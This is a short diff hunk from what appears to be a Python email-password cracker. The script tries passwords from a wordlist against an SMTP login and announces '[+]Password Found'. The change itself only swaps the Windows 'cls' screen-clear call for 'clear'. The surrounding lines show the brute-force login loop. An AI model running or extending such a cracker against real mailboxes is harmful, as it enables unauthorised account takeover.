@@ -64,7 +64,7 @@ for Password in PWF:
     try:
         smtpserver.login(Email, Password)
         print("[+]Password Found: {0}".format(Password))
-        os.system("cls")
+        os.system("clear")
         print("++++++++++++++++++++++++++++++++++++++++++++++++")
         print(" ")
         print("[+]Email Is {0}".format(Email))
